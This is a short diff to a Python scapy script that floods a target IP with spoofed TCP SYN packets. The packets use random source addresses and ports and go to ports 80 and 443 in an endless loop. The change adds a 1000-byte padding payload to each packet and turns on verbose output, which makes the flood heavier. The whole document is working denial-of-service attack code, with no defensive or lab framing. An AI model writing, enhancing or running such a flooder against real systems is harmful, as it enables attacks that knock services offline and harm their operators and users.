@@ -1,9 +1,12 @@
 #!/usr/bin/env python3
 from argparse import ArgumentParser
-from scapy.all import IP, TCP, RandShort, RandIP, send
+from scapy.all import IP, TCP, Raw, RandShort, RandIP, send
 import random
 
+
+PACKET_SIZE = 1000
 ports = [80, 443]
+
 
 def parse_arguments():
     parser = ArgumentParser(description="Floods target IP with SYN packets")
@@ -19,7 +22,7 @@ def main():
     print(f"Press CTRL + C to stop")
     while True:
         send(IP(src=RandIP(), dst=args.target)/TCP(sport=RandShort(),
-        dport=ports, flags="S"), verbose=0)
+        dport=ports, flags="S")/Raw(b"X" * PACKET_SIZE), verbose=1)
 
 if __name__ == '__main__':
     main()
